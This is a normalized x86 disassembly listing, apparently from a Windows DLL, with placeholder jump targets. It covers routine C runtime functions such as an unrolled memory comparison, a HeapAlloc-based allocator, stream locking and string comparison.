test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
jne r-xdata
mov eax edx
jmp r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x7 ]
movzx edx [ ecx - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x8 ]
movzx esi [ eax - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
jmp r-xdata
movzx esi [ eax - 0x1d ]
movzx edx [ ecx - 0x1d ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
mov esi [ eax + 0xc ]
cmp esi [ ecx + 0xc ]
je r-xdata
movzx esi [ eax + 0x9 ]
movzx ebx [ ecx + 0x9 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x7 ]
movzx ebx [ ecx + 0x7 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax - 0x19 ]
movzx edx [ ecx - 0x19 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x15 ]
movzx edx [ ecx - 0x15 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x11 ]
movzx edx [ ecx - 0x11 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xd ]
movzx edx [ ecx - 0xd ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x9 ]
movzx edx [ ecx - 0x9 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x5 ]
movzx edx [ ecx - 0x5 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
sub eax ecx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
test edx edx
je r-xdata
test eax eax
jne r-xdata
movzx esi [ eax - 0x1a ]
movzx edx [ ecx - 0x1a ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x16 ]
movzx edx [ ecx - 0x16 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x12 ]
movzx edx [ ecx - 0x12 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xe ]
movzx edx [ ecx - 0xe ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xa ]
movzx edx [ ecx - 0xa ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x6 ]
movzx edx [ ecx - 0x6 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x2 ]
movzx edx [ ecx - 0x2 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1b ]
movzx edx [ ecx - 0x1b ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x17 ]
movzx edx [ ecx - 0x17 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x13 ]
movzx edx [ ecx - 0x13 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xf ]
movzx edx [ ecx - 0xf ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xb ]
movzx edx [ ecx - 0xb ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx edx [ ecx - 0x7 ]
movzx esi [ eax - 0x7 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x3 ]
movzx edx [ ecx - 0x3 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x1c ]
movzx edx [ ecx - 0x1c ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x18 ]
movzx edx [ ecx - 0x18 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x14 ]
movzx edx [ ecx - 0x14 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x10 ]
movzx edx [ ecx - 0x10 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0xc ]
movzx edx [ ecx - 0xc ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x8 ]
movzx edx [ ecx - 0x8 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
movzx esi [ eax - 0x4 ]
movzx edx [ ecx - 0x4 ]
sub esi edx
je r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0xc ]
movzx ebx [ ecx + 0xc ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xa ]
movzx ebx [ ecx + 0xa ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
xor ecx ecx
test eax eax
setg cl
lea ecx [ ecx + ecx - 0x1 ]
mov eax ecx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
test esi esi
jne r-xdata
xor edx edx
test esi esi
setg dl
lea edx [ edx + edx - 0x1 ]
mov esi edx
jmp r-xdata
mov esi [ eax + 0x10 ]
cmp esi [ ecx + 0x10 ]
je r-xdata
movzx esi [ eax + 0xd ]
movzx ebx [ ecx + 0xd ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xb ]
movzx ebx [ ecx + 0xb ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx ebx [ ecx + 0x10 ]
movzx esi [ eax + 0x10 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0xe ]
movzx ebx [ ecx + 0xe ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x14 ]
cmp esi [ ecx + 0x14 ]
je r-xdata
movzx esi [ eax + 0x11 ]
movzx ebx [ ecx + 0x11 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0xf ]
movzx ebx [ ecx + 0xf ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x14 ]
movzx ebx [ ecx + 0x14 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x12 ]
movzx ebx [ ecx + 0x12 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x18 ]
cmp esi [ ecx + 0x18 ]
je r-xdata
movzx esi [ eax + 0x15 ]
movzx ebx [ ecx + 0x15 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x13 ]
movzx ebx [ ecx + 0x13 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x18 ]
movzx ebx [ ecx + 0x18 ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x16 ]
movzx ebx [ ecx + 0x16 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
mov esi [ eax + 0x1c ]
cmp esi [ ecx + 0x1c ]
je r-xdata
movzx esi [ eax + 0x19 ]
movzx ebx [ ecx + 0x19 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x17 ]
movzx ebx [ ecx + 0x17 ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
xor esi esi
movzx esi [ eax + 0x1c ]
movzx ebx [ ecx + 0x1c ]
sub esi ebx
je r-xdata
movzx esi [ eax + 0x1a ]
movzx ebx [ ecx + 0x1a ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
add eax edx
add ecx edx
sub edi edx
movzx esi [ eax + 0x1d ]
movzx ebx [ ecx + 0x1d ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1b ]
movzx ebx [ ecx + 0x1b ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
movzx esi [ eax + 0x1e ]
movzx ebx [ ecx + 0x1e ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
movzx esi [ eax + 0x1f ]
movzx ebx [ ecx + 0x1f ]
sub esi ebx
je r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
test esi esi
jne r-xdata
test esi esi
jne r-xdata
xor ebx ebx
test esi esi
setg bl
lea ebx [ ebx + ebx - 0x1 ]
mov esi ebx
jmp r-xdata
sub_1001333f
push 0xc
push r--data
call sub_10018984
and [ ebp - 0x1c ] 0x0
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
ja r-xdata
mov eax [ ebp - 0x1c ]
call sub_100189c9
retn
push 0x4
call sub_1001a48a
pop ecx
and [ ebp - 0x4 ] 0x0
push esi
call sub_1001bc96
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10013385
sub_1001338e
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_10017fdf
pop ecx
call sub_100167f3
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
mov edi [ HeapAlloc@IAT ]
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
call sub_10018dad
push 0x1e
call sub_10018c02
push 0xff
call sub_10013b3c
cmp eax 0x3
jne r-xdata
test esi esi
je r-xdata
test esi esi
jne r-xdata
push esi
call sub_1001333f
pop ecx
test eax eax
jne r-xdata
xor eax eax
inc eax
mov eax esi
jmp r-xdata
add esi 0xf
and esi 0xfffffff0
push esi
inc esi
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
push [ rw-data ]
call edi
push eax
jmp r-xdata
pop edi
mov eax ebx
pop ebx
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
pop esi
pop ebp
retn
call sub_100167f3
mov [ eax ] esi
push [ ebp + 0x8 ]
call sub_10017fdf
pop ecx
test eax eax
je r-xdata
call sub_100167f3
mov [ eax ] esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
sub_1001345e
mov eax [ rw-data ]
push esi
push 0x14
pop esi
test eax eax
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_100166ee
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor edx edx
mov ecx rw-data
jmp r-xdata
push 0x4
push esi
mov [ rw-data ] esi
call sub_100166ee
pop ecx
pop ecx
mov [ rw-data ] eax
test eax eax
jne r-xdata
mov [ edx + eax ] ecx
add ecx 0x20
add edx 0x4
cmp ecx rw-data
jl r-xdata
push 0x1a
pop eax
pop esi
retn
mov eax [ rw-data ]
push 0xfffffffe
pop esi
xor edx edx
mov ecx rw-data
push edi
mov [ ecx ] esi
cmp eax esi
je r-xdata
mov eax edx
sar eax 0x5
mov eax [ eax * 4 + rw-data ]
mov edi edx
and edi 0x1f
shl edi 0x6
mov eax [ edi + eax ]
cmp eax 0xffffffff
je r-xdata
pop edi
xor eax eax
pop esi
retn
test eax eax
jne r-xdata
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_1001352f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax rw-data
cmp esi eax
jb r-xdata
add esi 0x20
push esi
call [ EnterCriticalSection@IAT ]
cmp esi rw-data
ja r-xdata
mov ecx esi
sub ecx eax
sar ecx 0x5
add ecx 0x10
push ecx
call sub_1001a48a
or [ esi + 0xc ] 0x8000
pop ecx
jmp r-xdata
pop esi
pop ebp
retn
sub_10013570
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x14
jge r-xdata
mov eax [ ebp + 0xc ]
add eax 0x20
push eax
call [ EnterCriticalSection@IAT ]
pop ebp
retn
add eax 0x10
push eax
call sub_1001a48a
mov eax [ ebp + 0xc ]
or [ eax + 0xc ] 0x8000
pop ecx
pop ebp
retn
sub_100135a2
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx rw-data
cmp eax ecx
jb r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
cmp eax rw-data
ja r-xdata
and [ eax + 0xc ] 0xffff7fff
sub eax ecx
sar eax 0x5
add eax 0x10
push eax
call sub_1001a3b0
pop ecx
pop ebp
retn
sub_100135de
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0x14
mov eax [ ebp + 0xc ]
jge r-xdata
add eax 0x20
push eax
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
and [ eax + 0xc ] 0xffff7fff
add ecx 0x10
push ecx
call sub_1001a3b0
pop ecx
pop ebp
retn
sub_1001360d
push 0xc
push r--data
call sub_10018984
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov ebx [ ebp + 0x8 ]
cmp ebx esi
setne al
cmp eax esi
jne r-xdata
xor eax eax
cmp [ ebp + 0xc ] esi
setne al
cmp eax esi
je r-xdata
call sub_100167f3
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_10010b6c
add esp 0x14
or eax 0xffffffff
jmp r-xdata
mov [ ebp + 0x8 ] ebx
push ebx
call sub_1001352f
pop ecx
mov [ ebp - 0x4 ] esi
test [ ebx + 0xc ] 0x40
jne r-xdata
call sub_100189c9
retn
cmp [ ebp - 0x1c ] esi
jne r-xdata
push ebx
call sub_100190d8
pop ecx
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001371f
mov eax [ ebp - 0x1c ]
push ebx
call sub_1001c966
mov edi eax
lea eax [ ebp + 0x10 ]
push eax
push esi
push [ ebp + 0xc ]
push ebx
call sub_1001a626
mov [ ebp - 0x1c ] eax
push ebx
push edi
call sub_1001ca02
add esp 0x1c
mov ecx rw-data
cmp eax 0xfffffffe
je r-xdata
call sub_100167f3
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_10010b6c
add esp 0x14
or [ ebp - 0x1c ] 0xffffffff
cmp eax 0xffffffff
je r-xdata
mov edx eax
sar edx 0x5
mov ecx eax
and ecx 0x1f
shl ecx 0x6
add ecx [ edx * 4 + rw-data ]
jmp r-xdata
mov eax rw-data
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
mov ecx eax
sar ecx 0x5
and eax 0x1f
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
sub_10013730
mov edx [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
test edx 0x3
jne r-xdata
test edx 0x1
je r-xdata
mov eax [ edx ]
cmp al [ ecx ]
jne r-xdata
mov ax [ edx ]
add edx 0x2
cmp al [ ecx ]
jne r-xdata
mov al [ edx ]
add edx 0x1
cmp al [ ecx ]
jne r-xdata
sbb eax eax
shl eax 0x1
add eax 0x1
retn
or al al
je r-xdata
or al al
je r-xdata
add ecx 0x1
or al al
je r-xdata
xor eax eax
retn
cmp ah [ ecx + 0x1 ]
jne r-xdata
cmp ah [ ecx + 0x1 ]
jne r-xdata
test edx 0x2
je r-xdata
or ah ah
je r-xdata
or ah ah
je r-xdata
shr eax 0x10
cmp al [ ecx + 0x2 ]
jne r-xdata
add ecx 0x2
jmp r-xdata
or al al
je r-xdata
cmp ah [ ecx + 0x3 ]
jne r-xdata
add ecx 0x4
add edx 0x4
or ah ah
jne r-xdata
mov edi edi
sub_100137b8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_10017c1c
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
